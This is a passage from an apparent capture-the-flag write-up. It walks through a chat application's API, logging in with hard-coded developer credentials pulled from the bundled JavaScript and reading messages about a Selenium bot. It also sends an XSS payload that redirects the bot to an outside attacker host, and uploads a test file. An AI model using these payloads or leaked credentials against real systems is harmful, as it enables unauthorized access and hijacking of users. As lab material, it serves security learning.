+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">concat</span><span style="color:#E1E4E8">(_config_json__WEBPACK_IMPORTED_MODULE_1__.</span><span style="color:#79B8FF">BACKEND_URL</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'/api/login'</span><span style="color:#E1E4E8">), {</span></span>
+<span class="line"><span style="color:#E1E4E8">  method: </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">  headers: {</span></span>
+<span class="line"><span style="color:#E1E4E8">    Accept: </span><span style="color:#9ECBFF">'application/json'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">    'Content-Type'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'application/json'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">  },</span></span>
+<span class="line"><span style="color:#E1E4E8">  body: </span><span style="color:#79B8FF">JSON</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">stringify</span><span style="color:#E1E4E8">({</span></span>
+<span class="line"><span style="color:#E1E4E8">    username: </span><span style="color:#9ECBFF">'developer'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    password: </span><span style="color:#9ECBFF">'5up3rd3vl0per!!'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">  }),</span></span>
+<span class="line"><span style="color:#E1E4E8">})</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">res</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> res.</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">())</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (data.status </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> 200</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">      localStorage.</span><span style="color:#B392F0">setItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">, data.token)</span></span>
+<span class="line"><span style="color:#E1E4E8">      localStorage.</span><span style="color:#B392F0">setItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">, data.username)</span></span>
+<span class="line"><span style="color:#B392F0">      setLoading</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">  })</span></span></code></pre>
+<p>I tried using the API that we have to confirm that it’s talking with it. And it works!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span><span style="color:#79B8FF"> 200</span><span style="color:#9ECBFF"> OK</span></span>
+<span class="line"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/json; charset=utf-8</span></span>
+<span class="line"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 207</span></span>
+<span class="line"><span style="color:#85E89D">Date</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Sat, 03 Dec 2022 09:15:30 GMT</span></span>
+<span class="line"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">{</span><span style="color:#79B8FF">"token"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA1ODkzMCwiZXhwIjoxNjcwMDgwNTMwfQ.TCk_Ixejig808W5BainV05u5hmFlE65U0knzjvSIdwI"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"status"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"username"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>We can see multiple endpoints including <code>/api/chats/allChats</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">concat</span><span style="color:#E1E4E8">(_config_json__WEBPACK_IMPORTED_MODULE_1__.</span><span style="color:#79B8FF">BACKEND_URL</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"/api/chats/allChats"</span><span style="color:#E1E4E8">), {</span></span>
+<span class="line"><span style="color:#E1E4E8">              method: </span><span style="color:#9ECBFF">'GET'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">              headers: {</span></span>
+<span class="line"><span style="color:#E1E4E8">                token: localStorage.</span><span style="color:#B392F0">getItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">              }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }).</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">data</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">              return</span><span style="color:#E1E4E8"> data.</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">            }).</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">chats</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">              setallMessages</span><span style="color:#E1E4E8">(chats);</span></span>
+<span class="line"><span style="color:#E1E4E8">            });</span></span>
+<span class="line"><span style="color:#E1E4E8">          }, []);</span></span></code></pre>
+<p>I tried fetching it using the token I retrieved from the login.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span><span style="color:#79B8FF"> 200</span><span style="color:#9ECBFF"> OK</span></span>
+<span class="line"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/json; charset=utf-8</span></span>
+<span class="line"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 1812</span></span>
+<span class="line"><span style="color:#85E89D">Date</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Sat, 03 Dec 2022 09:20:29 GMT</span></span>
+<span class="line"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">[{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Hey!"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Hey!!"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"You are using the admin account on the server itself right?"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Yes"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Well thats good make sure to use the admin account on the server."</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Yes I know you did explained me why I should use it only on server."</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Nice."</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"The service checkup script that you created is not working anymore with the selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"false"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Yeah Sure"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"true"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">},{</span><span style="color:#79B8FF">"id"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"sender"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"tbug"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"receiver"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"developer"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Why userland city market place is not working for me?"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"timestamp"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2022-12-03 08:42:27"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"lastMessage"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"true"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"type"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">}]</span></span></code></pre>
+<p>The only interesting message was this:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>The service checkup script that you created is not working anymore with the Selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?</span></span></code></pre>
+<p>For the time being, this may be irrelevant until we check the other endpoints.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">concat</span><span style="color:#E1E4E8">(_config_json__WEBPACK_IMPORTED_MODULE_1__.</span><span style="color:#79B8FF">BACKEND_URL</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"/api/chats/"</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">concat</span><span style="color:#E1E4E8">(currentChat, </span><span style="color:#9ECBFF">"/add"</span><span style="color:#E1E4E8">), {</span></span>
+<span class="line"><span style="color:#E1E4E8">                method: </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                headers: {</span></span>
+<span class="line"><span style="color:#9ECBFF">                  'Accept'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'application/json'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">                  'Content-Type'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'application/json'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">                  'token'</span><span style="color:#E1E4E8">: localStorage.</span><span style="color:#B392F0">getItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">                },</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#F97583">var</span><span style="color:#B392F0"> uploadFile</span><span style="color:#F97583"> =</span><span style="color:#FFAB70"> e</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">            var</span><span style="color:#E1E4E8"> formData </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> FormData</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">            formData.</span><span style="color:#B392F0">append</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'uploadedFile'</span><span style="color:#E1E4E8">, e.target.files[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line"><span style="color:#B392F0">            fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">concat</span><span style="color:#E1E4E8">(_config_json__WEBPACK_IMPORTED_MODULE_1__.</span><span style="color:#79B8FF">BACKEND_URL</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"/api/"</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">concat</span><span style="color:#E1E4E8">(currentChat, </span><span style="color:#9ECBFF">"/upload"</span><span style="color:#E1E4E8">), {</span></span>
+<span class="line"><span style="color:#E1E4E8">              method: </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">              headers: {</span></span>
+<span class="line"><span style="color:#9ECBFF">                'token'</span><span style="color:#E1E4E8">: localStorage.</span><span style="color:#B392F0">getItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">              },</span></span>
+<span class="line"><span style="color:#E1E4E8">              body: formData</span></span>
+<span class="line"><span style="color:#E1E4E8">            }).</span></span></code></pre>
+<p>And now we have a way to interact with users by sending them files and messages!</p>
+<p>Now, let’s get back to the message that we got earlier, where the users were talking about a Selenium script. Selenium allows you to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application. We can assume now that we will have to trick the bot into downloading our files or interacting with our messages!</p>
+<p>Here’s an example on how we can use both <code>/add</code> and <code>/upload</code> API to download/add files/messages:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#F97583">POST</span><span style="color:#E1E4E8"> /api/chats/admin/add </span><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span></span>
+<span class="line"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 10.129.255.120:9000</span></span>
+<span class="line"><span style="color:#85E89D">Cache-Control</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> max-age=0</span></span>
+<span class="line"><span style="color:#85E89D">token</span><span style="color:#F97583">:</span><span style="color:#9ECBFF">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs</span></span>
+<span class="line"><span style="color:#85E89D">Upgrade-Insecure-Requests</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 1</span></span>
+<span class="line"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span></span>
+<span class="line"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="line"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line"><span style="color:#85E89D">Accept-Language</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> en-US,en;q=0.9</span></span>
+<span class="line"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/json</span></span>
+<span class="line"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 62</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">{</span><span style="color:#79B8FF">"message"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;script>document.location="</span><span style="color:#FDAEB7;font-style:italic">http:</span><span style="color:#6A737D">//10.10.10.10/jaja"&#x3C;/script>"}</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">POST</span><span style="color:#9ECBFF"> /api/admin/upload</span><span style="color:#9ECBFF"> HTTP/1.1</span></span>
+<span class="line"><span style="color:#B392F0">Host:</span><span style="color:#9ECBFF"> 10.129.255.120:9000</span></span>
+<span class="line"><span style="color:#B392F0">User-Agent:</span><span style="color:#9ECBFF"> Mozilla/5.0</span><span style="color:#E1E4E8"> (X11; </span><span style="color:#B392F0">Linux</span><span style="color:#9ECBFF"> x86_64</span><span style="color:#E1E4E8">) AppleWebKit/537.36 (</span><span style="color:#B392F0">KHTML,</span><span style="color:#9ECBFF"> like</span><span style="color:#9ECBFF"> Gecko</span><span style="color:#E1E4E8">) Chrome/107.0.0.0 Safari/537.36</span></span>
+<span class="line"><span style="color:#B392F0">Accept-Encoding:</span><span style="color:#9ECBFF"> gzip,</span><span style="color:#9ECBFF"> deflate</span></span>
+<span class="line"><span style="color:#B392F0">Accept:</span><span style="color:#9ECBFF"> text/html,application/xhtml+xml,application/xml</span><span style="color:#E1E4E8">;q</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0.9,image/avif,image/webp,image/apng,*/*</span><span style="color:#E1E4E8">;q</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0.8,application/signed-exchange</span><span style="color:#E1E4E8">;v</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">b3</span><span style="color:#E1E4E8">;q</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0.9</span></span>
+<span class="line"><span style="color:#B392F0">Connection:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#B392F0">Cache-Control:</span><span style="color:#9ECBFF"> max-age=</span><span style="color:#79B8FF">0</span></span>
+<span class="line"><span style="color:#B392F0">token:</span><span style="color:#9ECBFF"> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs</span></span>
+<span class="line"><span style="color:#B392F0">Upgrade-Insecure-Requests:</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line"><span style="color:#B392F0">Accept-Language:</span><span style="color:#9ECBFF"> en-US,en</span><span style="color:#E1E4E8">;q</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0.9</span></span>
+<span class="line"><span style="color:#B392F0">Content-Length:</span><span style="color:#79B8FF"> 247</span></span>
+<span class="line"><span style="color:#B392F0">Content-Type:</span><span style="color:#9ECBFF"> multipart/form-data</span><span style="color:#E1E4E8">; boundary</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">02427ffc75ddf91f43eb19151c610654</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">--02427ffc75ddf91f43eb19151c610654</span></span>
+<span class="line"><span style="color:#B392F0">Content-Disposition:</span><span style="color:#9ECBFF"> form-data</span><span style="color:#E1E4E8">; name</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"uploadedFile"</span><span style="color:#E1E4E8">; filename</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"testfile"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">pwned</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">--02427ffc75ddf91f43eb19151c610654--</span></span></code></pre>
+<h3 id="bonus-part---running-gui-app">BONUS PART - Running GUI app</h3>
+<blockquote>
+<p>This part is not needed to continue exploitation or understand the exploit path.</p>
+</blockquote>
+<p>So, if we try to open the GUI application. It will keep hanging and that’s because it wasn’t able to reach the API as the <code>config.json</code> file which includes the <code>BACKEND_URL</code> variable is missing. Here we have two options:</p>
+<ol>
+<li>Create the <code>config.json</code> file with the proper <code>BACKEND_URL</code>, which is the instance ip</li>
+<li>The lazy way (Which I used XD) is to change all the <code>_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL</code> to the ip instance.</li>
+</ol>
+<p><img src="/assets/img/stack-the-flags-2022/vscode-replace.webp" alt="A screenshot of replacing strings with vscode"></p>
